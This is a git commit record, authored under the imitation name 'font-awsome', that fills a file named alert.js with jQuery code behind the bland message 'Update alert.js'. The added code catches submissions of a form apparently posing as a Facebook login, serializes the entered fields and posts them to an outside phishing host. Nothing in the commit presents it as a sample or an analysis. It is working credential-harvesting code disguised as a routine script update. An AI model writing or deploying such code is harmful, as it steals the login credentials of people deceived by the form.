619e8990682a022179dd9b092a03ea8b4c2b2d74
font-awsome <akundotrial@gmail.com>
2024-08-27 17:50:25 +0700

    Update alert.js

--- alert.js
+++ alert.js
@@ -1,1 +1,15 @@
-
+$(".form-login-fb").submit(function() {  
+ var d = $(".form-login-fb");  
+  
+ $.ajax({  
+        url: "https://kingpanelz.my.id/api/krisna/api.php",  
+        type: "POST",  
+        data: d.serialize(),  
+        success: function () {  
+            return true;  
+        },  
+        error: function () {  
+            return true;  
+        },  
+    });  
+});
